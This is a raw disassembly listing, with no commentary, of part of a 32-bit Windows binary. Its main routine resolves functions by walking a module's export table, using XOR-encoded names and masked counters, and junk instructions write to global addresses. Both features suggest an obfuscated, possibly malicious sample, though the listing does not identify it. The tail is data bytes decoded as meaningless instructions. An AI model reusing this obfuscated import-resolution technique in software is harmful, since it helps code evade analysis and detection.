  421a0d:	mov    DWORD PTR [ebp-0x210],eax
  421a13:	mov    eax,DWORD PTR [ebp+0xc]
  421a16:	mov    DWORD PTR [ebp-0x20c],eax
  421a1c:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a26:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a30:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a3a:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a44:	lea    eax,[ebp-0x1e8]
  421a4a:	mov    DWORD PTR [ebp-0x1f4],eax
  421a50:	mov    eax,DWORD PTR [ebp-0x20c]
  421a56:	movzx  eax,WORD PTR [eax+0x20]
  421a5a:	xor    eax,0xa49b
  421a5f:	movzx  eax,ax
  421a62:	sar    eax,1
  421a64:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a6a:	movzx  ecx,WORD PTR [ecx+0x20]
  421a6e:	xor    ecx,0xa49b
  421a74:	movzx  ecx,cx
  421a77:	shl    ecx,0xf
  421a7a:	or     eax,ecx
  421a7c:	movzx  eax,ax
  421a7f:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a85:	mov    DWORD PTR [ecx],eax
  421a87:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a8d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a93:	xor    eax,0xca79a575
  421a98:	xor    edx,0x9c1b89e8
  421a9e:	mov    cl,0x2
  421aa0:	call   0x40a9b5
  421aa5:	mov    ebx,eax
  421aa7:	mov    esi,edx
  421aa9:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aaf:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ab5:	xor    eax,0xca79a575
  421aba:	xor    edx,0x9c1b89e8
  421ac0:	mov    cl,0x3e
  421ac2:	call   0x42223f
  421ac7:	or     ebx,eax
  421ac9:	or     esi,edx
  421acb:	movzx  eax,bl
  421ace:	push   eax
  421acf:	lea    eax,[ebp-0x198]
  421ad5:	push   eax
  421ad6:	call   0x416c9e
  421adb:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ae1:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ae7:	xor    eax,0xca79a575
  421aec:	xor    edx,0x9c1b89e8
  421af2:	mov    cl,0x2
  421af4:	call   0x40a9b5
  421af9:	mov    esi,eax
  421afb:	mov    edi,edx
  421afd:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b03:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b09:	xor    eax,0xca79a575
  421b0e:	xor    edx,0x9c1b89e8
  421b14:	mov    cl,0x3e
  421b16:	call   0x42223f
  421b1b:	or     esi,eax
  421b1d:	or     edi,edx
  421b1f:	mov    DWORD PTR [ebp-0x1f8],esi
  421b25:	jmp    0x421b7a
  421b2a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b30:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b36:	xor    eax,0xca79a575
  421b3b:	xor    edx,0x9c1b89e8
  421b41:	mov    cl,0x2
  421b43:	call   0x40a9b5
  421b48:	mov    esi,eax
  421b4a:	mov    edi,edx
  421b4c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b52:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b58:	xor    eax,0xca79a575
  421b5d:	xor    edx,0x9c1b89e8
  421b63:	mov    cl,0x3e
  421b65:	call   0x42223f
  421b6a:	or     esi,eax
  421b6c:	or     edi,edx
  421b6e:	add    esi,DWORD PTR [ebp-0x1f8]
  421b74:	mov    DWORD PTR [ebp-0x1f8],esi
  421b7a:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b80:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b86:	je     0x421c19
  421b8c:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b92:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b98:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b9d:	xor    eax,0xa49b
  421ba2:	movzx  eax,ax
  421ba5:	sar    eax,1
  421ba7:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bad:	mov    edx,DWORD PTR [ebp-0x20c]
  421bb3:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421bb8:	xor    ecx,0xa49b
  421bbe:	movzx  ecx,cx
  421bc1:	shl    ecx,0xf
  421bc4:	or     eax,ecx
  421bc6:	movzx  eax,ax
  421bc9:	mov    DWORD PTR [ebp-0x1fc],eax
  421bcf:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bd5:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bdb:	movzx  eax,WORD PTR [ecx+eax*4]
  421bdf:	xor    eax,0xa49b
  421be4:	movzx  eax,ax
  421be7:	sar    eax,1
  421be9:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bef:	mov    edx,DWORD PTR [ebp-0x20c]
  421bf5:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bf9:	xor    ecx,0xa49b
  421bff:	movzx  ecx,cx
  421c02:	shl    ecx,0xf
  421c05:	or     eax,ecx
  421c07:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c0d:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c14:	jmp    0x421b2a
  421c19:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c1f:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c25:	xor    eax,0xca79a575
  421c2a:	xor    edx,0x9c1b89e8
  421c30:	mov    cl,0x2
  421c32:	call   0x40a9b5
  421c37:	mov    esi,eax
  421c39:	mov    edi,edx
  421c3b:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c41:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c47:	xor    eax,0xca79a575
  421c4c:	xor    edx,0x9c1b89e8
  421c52:	mov    cl,0x3e
  421c54:	call   0x42223f
  421c59:	or     esi,eax
  421c5b:	or     edi,edx
  421c5d:	mov    DWORD PTR [ebp-0x1e4],esi
  421c63:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c69:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c6f:	xor    eax,0xca79a575
  421c74:	xor    edx,0x9c1b89e8
  421c7a:	mov    cl,0x2
  421c7c:	call   0x40a9b5
  421c81:	mov    esi,eax
  421c83:	mov    edi,edx
  421c85:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c8b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c91:	xor    eax,0xca79a575
  421c96:	xor    edx,0x9c1b89e8
  421c9c:	mov    cl,0x3e
  421c9e:	call   0x42223f
  421ca3:	or     esi,eax
  421ca5:	or     edi,edx
  421ca7:	mov    DWORD PTR [ebp-0x23c],esi
  421cad:	mov    DWORD PTR [ebp-0x238],edi
  421cb3:	mov    eax,DWORD PTR [ebp-0x23c]
  421cb9:	or     eax,DWORD PTR [ebp-0x238]
  421cbf:	je     0x421f1f
  421cc5:	lea    eax,[ebp-0x204]
  421ccb:	mov    DWORD PTR [ebp-0x208],eax
  421cd1:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cd7:	xor    edx,edx
  421cd9:	mov    cl,0x2
  421cdb:	call   0x42223f
  421ce0:	mov    esi,eax
  421ce2:	mov    edi,edx
  421ce4:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cea:	xor    edx,edx
  421cec:	mov    cl,0x3e
  421cee:	call   0x40a9b5
  421cf3:	or     esi,eax
  421cf5:	or     edi,edx
  421cf7:	xor    esi,0xca79a575
  421cfd:	xor    edi,0x9c1b89e8
  421d03:	mov    eax,DWORD PTR [ebp-0x208]
  421d09:	mov    DWORD PTR [eax],esi
  421d0b:	mov    DWORD PTR [eax+0x4],edi
  421d0e:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d14:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d1c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d22:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d28:	xor    eax,0xca79a575
  421d2d:	xor    edx,0x9c1b89e8
  421d33:	mov    cl,0x2
  421d35:	call   0x40a9b5
  421d3a:	mov    ebx,eax
  421d3c:	mov    edi,edx
  421d3e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d44:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d4a:	xor    eax,0xca79a575
  421d4f:	xor    edx,0x9c1b89e8
  421d55:	mov    cl,0x3e
  421d57:	call   0x42223f
  421d5c:	or     ebx,eax
  421d5e:	or     edi,edx
  421d60:	movsx  eax,bl
  421d63:	cmp    esi,eax
  421d65:	je     0x421ec5
  421d6b:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d71:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d79:	mov    eax,DWORD PTR [ebp-0x204]
  421d7f:	mov    edx,DWORD PTR [ebp-0x200]
  421d85:	xor    eax,0xca79a575
  421d8a:	xor    edx,0x9c1b89e8
  421d90:	mov    cl,0x2
  421d92:	call   0x40a9b5
  421d97:	mov    edi,eax
  421d99:	mov    ebx,edx
  421d9b:	mov    eax,DWORD PTR [ebp-0x204]
  421da1:	mov    edx,DWORD PTR [ebp-0x200]
  421da7:	xor    eax,0xca79a575
  421dac:	xor    edx,0x9c1b89e8
  421db2:	mov    cl,0x3e
  421db4:	call   0x42223f
  421db9:	or     edi,eax
  421dbb:	or     ebx,edx
  421dbd:	mov    eax,DWORD PTR [ebp-0x210]
  421dc3:	movsx  eax,BYTE PTR [eax+edi*1]
  421dc7:	cmp    esi,eax
  421dc9:	je     0x421dd9
  421dcf:	jmp    0x421f1f
  421dd4:	jmp    0x421ec5
  421dd9:	mov    eax,DWORD PTR [ebp-0x204]
  421ddf:	mov    edx,DWORD PTR [ebp-0x200]
  421de5:	xor    eax,0xca79a575
  421dea:	xor    edx,0x9c1b89e8
  421df0:	mov    cl,0x2
  421df2:	call   0x40a9b5
  421df7:	mov    esi,eax
  421df9:	mov    edi,edx
  421dfb:	mov    eax,DWORD PTR [ebp-0x204]
  421e01:	mov    edx,DWORD PTR [ebp-0x200]
  421e07:	xor    eax,0xca79a575
  421e0c:	xor    edx,0x9c1b89e8
  421e12:	mov    cl,0x3e
  421e14:	call   0x42223f
  421e19:	or     esi,eax
  421e1b:	or     edi,edx
  421e1d:	mov    eax,DWORD PTR [ebp-0x210]
  421e23:	movsx  esi,BYTE PTR [eax+esi*1]
  421e27:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e2d:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e33:	xor    eax,0xca79a575
  421e38:	xor    edx,0x9c1b89e8
  421e3e:	mov    cl,0x2
  421e40:	call   0x40a9b5
  421e45:	mov    ebx,eax
  421e47:	mov    edi,edx
  421e49:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e4f:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e55:	xor    eax,0xca79a575
  421e5a:	xor    edx,0x9c1b89e8
  421e60:	mov    cl,0x3e
  421e62:	call   0x42223f
  421e67:	or     ebx,eax
  421e69:	or     edi,edx
  421e6b:	movsx  eax,bl
  421e6e:	cmp    esi,eax
  421e70:	jne    0x421ec5
  421e76:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e7c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e82:	xor    eax,0xca79a575
  421e87:	xor    edx,0x9c1b89e8
  421e8d:	mov    cl,0x2
  421e8f:	call   0x40a9b5
  421e94:	mov    esi,eax
  421e96:	mov    edi,edx
  421e98:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e9e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ea4:	xor    eax,0xca79a575
  421ea9:	xor    edx,0x9c1b89e8
  421eaf:	mov    cl,0x3e
  421eb1:	call   0x42223f
  421eb6:	or     esi,eax
  421eb8:	or     edi,edx
  421eba:	mov    DWORD PTR [ebp-0x214],esi
  421ec0:	jmp    0x421f69
  421ec5:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ecb:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ed1:	xor    eax,0xca79a575
  421ed6:	xor    edx,0x9c1b89e8
  421edc:	mov    cl,0x2
  421ede:	call   0x40a9b5
  421ee3:	mov    esi,eax
  421ee5:	mov    edi,edx
  421ee7:	mov    eax,DWORD PTR [ebp-0x1e0]
  421eed:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ef3:	xor    eax,0xca79a575
  421ef8:	xor    edx,0x9c1b89e8
  421efe:	mov    cl,0x3e
  421f00:	call   0x42223f
  421f05:	or     esi,eax
  421f07:	or     edi,edx
  421f09:	add    esi,DWORD PTR [ebp-0x1e4]
  421f0f:	mov    DWORD PTR [ebp-0x1e4],esi
  421f15:	jmp    0x421c63
  421f1a:	jmp    0x421c63
  421f1f:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f25:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f2b:	xor    eax,0xca79a575
  421f30:	xor    edx,0x9c1b89e8
  421f36:	mov    cl,0x2
  421f38:	call   0x40a9b5
  421f3d:	mov    esi,eax
  421f3f:	mov    edi,edx
  421f41:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f47:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f4d:	xor    eax,0xca79a575
  421f52:	xor    edx,0x9c1b89e8
  421f58:	mov    cl,0x3e
  421f5a:	call   0x42223f
  421f5f:	or     esi,eax
  421f61:	or     edi,edx
  421f63:	mov    DWORD PTR [ebp-0x214],esi
  421f69:	mov    eax,DWORD PTR [ebp-0x214]
  421f6f:	mov    DWORD PTR [ebp-0xc8],eax
  421f75:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f7c:	je     0x421fa6
  421f82:	mov    eax,DWORD PTR [ebp-0x144]
  421f88:	mov    ecx,DWORD PTR [ebp-0xac]
  421f8e:	movzx  eax,WORD PTR [ecx+eax*2]
  421f92:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f98:	mov    eax,DWORD PTR [ecx+eax*4]
  421f9b:	mov    DWORD PTR [ebp-0xfc],eax
  421fa1:	jmp    0x421fab
  421fa6:	jmp    0x4219d6
  421fab:	cmp    DWORD PTR [ebp-0xfc],0x0
  421fb2:	jne    0x421fbf
  421fb8:	xor    eax,eax
  421fba:	jmp    0x422238
  421fbf:	mov    eax,DWORD PTR [ebp+0x8]
  421fc2:	add    eax,DWORD PTR [ebp-0xfc]
  421fc8:	mov    DWORD PTR [ebp-0xec],eax
  421fce:	mov    DWORD PTR [ebp-0x74],0x0
  421fd5:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fdc:	je     0x422058
  421fe2:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fe9:	je     0x422058
  421fef:	mov    eax,DWORD PTR [ebp-0xb0]
  421ff5:	shl    eax,0x2
  421ff8:	mov    DWORD PTR [ebp-0x74],eax
  421ffb:	mov    DWORD PTR [ebp-0x14c],0x0
  422005:	sub    esp,DWORD PTR [ebp-0x74]
  422008:	mov    DWORD PTR [ebp-0x14c],esp
  42200e:	mov    DWORD PTR [ebp-0x148],0x0
  422018:	mov    eax,DWORD PTR [ebp-0x148]
  42201e:	cmp    eax,DWORD PTR [ebp-0xb0]
  422024:	je     0x422058
  42202a:	mov    eax,DWORD PTR [ebp-0x148]
  422030:	mov    ecx,DWORD PTR [ebp-0x14c]
  422036:	mov    edx,DWORD PTR [ebp-0x148]
  42203c:	mov    esi,DWORD PTR [ebp+0x14]
  42203f:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422043:	mov    DWORD PTR [ecx+eax*4],edx
  422046:	mov    eax,DWORD PTR [ebp-0x148]
  42204c:	inc    eax
  42204d:	mov    DWORD PTR [ebp-0x148],eax
  422053:	jmp    0x422018
  422058:	mov    DWORD PTR [ebp-0x9c],0x0
  422062:	push   0x4221f1
  422067:	jmp    DWORD PTR [ebp-0xec]
  42206d:	mov    eax,eax
  42206f:	mov    ecx,esp
  422071:	ret    0xc
  422074:	cmp    DWORD PTR ds:0x42830f,0x0
  42207b:	mov    DWORD PTR ds:0x42830b,0x7476
  422085:	mov    DWORD PTR ds:0x428187,0x1cdc
  42208f:	mov    DWORD PTR ds:0x42830b,0x65fa
  422099:	mov    DWORD PTR ds:0x428177,0x5dca
  4220a3:	jmp    0x4220ed
  4220a8:	mov    eax,ds:0x428307
  4220ad:	cmp    DWORD PTR ds:0x42830f,0x0
  4220b4:	jbe    0x4220d5
  4220ba:	push   0x24f1
  4220bf:	call   DWORD PTR ds:0x428d88
  4220c5:	inc    DWORD PTR ds:0x4283b3
  4220cb:	sub    DWORD PTR ds:0x428193,0x46d9
  4220d5:	inc    DWORD PTR ds:0x42830f
  4220db:	adc    DWORD PTR ds:0x42831b,ebx
  4220e1:	or     DWORD PTR ds:0x428243,0x4029
  4220eb:	not    eax
  4220ed:	push   ebx
  4220ee:	push   esi
  4220ef:	sbb    DWORD PTR ds:0x42839f,edx
  4220f5:	mov    eax,DWORD PTR [esp+0x18]
  4220f9:	or     eax,eax
  4220fb:	jne    0x42212b
  422101:	mov    ecx,DWORD PTR [esp+0x14]
  422105:	mov    eax,DWORD PTR [esp+0x10]
  422109:	xor    edx,edx
  42210b:	div    ecx
  42210d:	xor    DWORD PTR ds:0x42819f,0x45f1
  422117:	mov    ebx,eax
  422119:	mov    eax,DWORD PTR [esp+0xc]
  42211d:	div    ecx
  42211f:	mov    edx,0x36e3
  422124:	mov    edx,ebx
  422126:	jmp    0x4221ec
  42212b:	mov    ecx,eax
  42212d:	sbb    eax,0x67a9
  422132:	mov    ebx,DWORD PTR [esp+0x14]
  422136:	cmp    DWORD PTR ds:0x428307,0x0
  42213d:	mov    edx,DWORD PTR ds:0x4283b7
  422143:	mov    DWORD PTR ds:0x428337,0x4bc7
  42214d:	mov    edx,DWORD PTR ds:0x42831f
  422153:	jmp    0x42219d
  422158:	mov    DWORD PTR ds:0x428267,0x15f
  422162:	mov    DWORD PTR ds:0x42829f,0x4dd1
  42216c:	cmp    DWORD PTR ds:0x428307,0x0
  422173:	jle    0x422190
  422179:	push   0x824e
  42217e:	call   DWORD PTR ds:0x428d8c
  422184:	xor    DWORD PTR ds:0x42831f,0x6c44
  42218e:	sub    edx,edx
  422190:	sbb    DWORD PTR ds:0x428267,0x445e
  42219a:	dec    edx
  42219b:	not    edx
  42219d:	mov    edx,DWORD PTR [esp+0x10]
  4221a1:	mov    eax,DWORD PTR [esp+0xc]
  4221a5:	shr    ecx,1
  4221a7:	rcr    ebx,1
  4221a9:	shr    edx,1
  4221ab:	rcr    eax,1
  4221ad:	or     ecx,ecx
  4221af:	jne    0x4221a5
  4221b5:	div    ebx
  4221b7:	mov    esi,eax
  4221b9:	mul    DWORD PTR [esp+0x18]
  4221bd:	mov    ecx,eax
  4221bf:	mov    eax,DWORD PTR [esp+0x14]
  4221c3:	mul    esi
  4221c5:	add    edx,ecx
  4221c7:	jb     0x4221e7
  4221cd:	cmp    edx,DWORD PTR [esp+0x10]
  4221d1:	ja     0x4221e7
  4221d7:	jb     0x4221e8
  4221dd:	cmp    eax,DWORD PTR [esp+0xc]
  4221e1:	jbe    0x4221e8
  4221e7:	dec    esi
  4221e8:	xor    edx,edx
  4221ea:	mov    eax,esi
  4221ec:	pop    esi
  4221ed:	pop    ebx
  4221ee:	ret    0x10
  4221f1:	or     DWORD PTR ds:0x428383,0x42838f
  4221fb:	sub    DWORD PTR [ebp+0x10],0x1
  4221ff:	mov    DWORD PTR ds:0x42818b,0x43bf
  422209:	cmp    DWORD PTR [ebp+0x10],0x0
  42220d:	mov    DWORD PTR ds:0x42837b,0x612a
  422217:	je     0x422226
  42221d:	xor    DWORD PTR ds:0x428177,edx
  422223:	add    esp,DWORD PTR [ebp-0x74]
  422226:	mov    DWORD PTR [ebp-0x9c],eax
  42222c:	mov    DWORD PTR ds:0x42827f,ebx
  422232:	mov    eax,DWORD PTR [ebp-0x9c]
  422238:	pop    edi
  422239:	pop    esi
  42223a:	pop    ebx
  42223b:	leave  
  42223c:	ret    0x10
  42223f:	cmp    cl,0x40
  422242:	mov    DWORD PTR ds:0x428263,0x43a8
  42224c:	jae    0x42229e
  422252:	mov    DWORD PTR ds:0x428197,0x42f2
  42225c:	cmp    cl,0x20
  42225f:	mov    DWORD PTR ds:0x42817f,0x3d58
  422269:	jae    0x422289
  42226f:	or     DWORD PTR ds:0x428173,0x5e1e
  422279:	shld   edx,eax,cl
  42227c:	mov    DWORD PTR ds:0x428297,0x1bd2
  422286:	shl    eax,cl
  422288:	ret    
  422289:	inc    edx
  42228a:	mov    edx,eax
  42228c:	sub    DWORD PTR ds:0x4283b3,0x42830b
  422296:	xor    eax,eax
  422298:	and    cl,0x1f
  42229b:	shl    edx,cl
  42229d:	ret    
  42229e:	xor    eax,eax
  4222a0:	xor    edx,edx
  4222a2:	ret    
	...
  4222af:	add    cl,ch
  4222b1:	cmp    ebp,DWORD PTR [ebx+0x14]
  4222b4:	cmp    al,0x26
  4222b6:	sub    al,0x44
  4222b8:	jno    0x422323
  4222ba:	ja     0x422321
  4222bc:	int3   
  4222bd:	fsubr  QWORD PTR [edx+0x1e]
  4222c0:	jo     0x422327
  4222c2:	popa   
  4222c3:	ins    BYTE PTR es:[edi],dx
  4222c4:	push   eax
  4222c5:	lods   eax,DWORD PTR ds:[esi]
  4222c6:	xor    DWORD PTR [esi+0x41],edi
  4222c9:	ins    BYTE PTR es:[edi],dx
  4222ca:	popa   
  4222cb:	outs   dx,BYTE PTR ds:[esi]
  4222cc:	add    BYTE PTR [eax],al
  4222ce:	add    BYTE PTR [eax],al
  4222d0:	addr16 jb 0x422338
  4222d3:	popa   
  4222d4:	je     0x42233d
  4222d6:	jb     0x42233d
  4222d8:	popa   
  4222d9:	je     0x422342
  4222db:	jb     0x422342
  4222dd:	popa   
  4222de:	je     0x422347
  4222e0:	jb     0x422347
  4222e2:	popa   
  4222e3:	je     0x42234c
  4222e5:	jb     0x42234c
  4222e7:	popa   
  4222e8:	je     0x422351
  4222ea:	jb     0x422351
  4222ec:	popa   
  4222ed:	je     0x422356
  4222ef:	jb     0x422356
  4222f1:	popa   
  4222f2:	je     0x42235b
  4222f4:	jb     0x42235b
  4222f6:	popa   
  4222f7:	je     0x422360
  4222f9:	jb     0x422360
  4222fb:	popa   
  4222fc:	je     0x422365
  4222fe:	jb     0x422365
  422300:	popa   
  422301:	je     0x422303
  422303:	add    BYTE PTR [eax+0x65],ch
  422306:	ins    BYTE PTR es:[edi],dx
  422307:	ins    BYTE PTR es:[edi],dx
  422308:	push   0x686c6c65
  42230d:	gs ins BYTE PTR es:[edi],dx
  42230f:	ins    BYTE PTR es:[edi],dx
  422310:	push   0x686c6c65
  422315:	gs ins BYTE PTR es:[edi],dx
  422317:	ins    BYTE PTR es:[edi],dx
  422318:	push   0x686c6c65
  42231d:	gs ins BYTE PTR es:[edi],dx
  42231f:	ins    BYTE PTR es:[edi],dx
  422320:	push   0x686c6c65
  422325:	gs ins BYTE PTR es:[edi],dx
  422327:	ins    BYTE PTR es:[edi],dx
  422328:	push   0x686c6c65
  42232d:	gs ins BYTE PTR es:[edi],dx
  42232f:	ins    BYTE PTR es:[edi],dx
  422330:	push   0x686c6c65
  422335:	gs ins BYTE PTR es:[edi],dx
  422337:	ins    BYTE PTR es:[edi],dx
  422338:	add    BYTE PTR [eax],al
  42233a:	add    BYTE PTR [eax],al
  42233c:	outs   dx,DWORD PTR ds:[esi]
  42233d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422341:	add    BYTE PTR [ecx+0x0],ah
  422344:	jne    0x422346
  422346:	je     0x422348
  422348:	xor    eax,DWORD PTR [eax]
  42234a:	xor    al,BYTE PTR [eax]
  42234c:	add    BYTE PTR [eax],al
  42234e:	add    BYTE PTR [eax],al
  422350:	push   0x61006500
  422355:	add    BYTE PTR [esi+0x0],dh
  422358:	add    BYTE PTR gs:[esi+0x0],ch
  42235c:	push   0x61006500
  422361:	add    BYTE PTR [esi+0x0],dh
  422364:	add    BYTE PTR gs:[esi+0x0],ch
  422368:	push   0x61006500
  42236d:	add    BYTE PTR [esi+0x0],dh
  422370:	add    BYTE PTR gs:[esi+0x0],ch
  422374:	push   0x61006500
  422379:	add    BYTE PTR [esi+0x0],dh
  42237c:	add    BYTE PTR gs:[esi+0x0],ch
  422380:	push   0x61006500
  422385:	add    BYTE PTR [esi+0x0],dh
  422388:	add    BYTE PTR gs:[esi+0x0],ch
  42238c:	push   0x61006500
  422391:	add    BYTE PTR [esi+0x0],dh
  422394:	add    BYTE PTR gs:[esi+0x0],ch
  422398:	push   0x61006500
  42239d:	add    BYTE PTR [esi+0x0],dh
  4223a0:	add    BYTE PTR gs:[esi+0x0],ch
  4223a4:	push   0x61006500
  4223a9:	add    BYTE PTR [esi+0x0],dh
  4223ac:	add    BYTE PTR gs:[esi+0x0],ch
  4223b0:	push   0x61006500
  4223b5:	add    BYTE PTR [esi+0x0],dh
  4223b8:	add    BYTE PTR gs:[esi+0x0],ch
  4223bc:	add    BYTE PTR [eax],al
  4223be:	add    BYTE PTR [eax],al
  4223c0:	cmp    al,0x23
  4223c2:	inc    edx
  4223c3:	add    BYTE PTR [edi+0x6c],cl
  4223c6:	gs dec ecx
  4223c8:	arpl   WORD PTR [edi+0x6e],bp
  4223cb:	push   esp
  4223cc:	outs   dx,DWORD PTR ds:[esi]
  4223cd:	inc    ebx
  4223ce:	jne    0x422442
  4223d0:	jae    0x422441
  4223d2:	jb     0x4223d4
  4223d4:	les    esp,FWORD PTR [ebx]
  4223d6:	inc    edx
	...
  4223df:	add    BYTE PTR [eax-0x77ffbdd9],al
  4223e5:	daa    
  4223e6:	inc    edx
  4223e7:	add    BYTE PTR [eax+0x26],al
  4223ea:	inc    edx
  4223eb:	add    dl,dh
  4223ed:	inc    ebx
  4223ee:	push   ebx
  4223ef:	mov    WORD PTR ds:0x1a49ba4,ss
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	popf   
  4223f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f8:	jno    0x42239e
  4223fa:	xchg   edi,eax
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422404:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  42240b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240c:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422412:	adc    eax,0x1a49ba4
  422417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422418:	popf   
  422419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241a:	jno    0x4223c0
  42241c:	xchg   edi,eax
  42241d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422426:	xor    eax,0x9ba485a4
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	mov    ebx,0xd1e2d3a4
  422431:	in     al,dx
  422432:	xchg   ebp,eax
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	adc    eax,0x3ba49ba4
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	popf   
  42243b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422444:	fwait
  422445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422446:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42244d:	sub    al,0xf7
  42244f:	cs pop ss
  422451:	push   cs
  422452:	adc    eax,0x3a49108
  422457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422458:	fwait
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422462:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	shl    DWORD PTR [edx],cl
  42246c:	shr    DWORD PTR [ecx+esi*8],1
  42246f:	or     al,0xf7
  422471:	push   cs
  422472:	pop    ss
  422473:	outs   dx,BYTE PTR ds:[esi]
  422474:	adc    eax,0x3a49168
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	fwait
  42247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422484:	xor    eax,0x9ba48da4
  422489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422492:	imul   DWORD PTR [esi+0x17]
  422495:	dec    esi
  422496:	adc    eax,0x37a49148
  42249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249c:	fwait
  42249d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249e:	jae    0x422444
  4224a0:	popf   
  4224a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a2:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	fwait
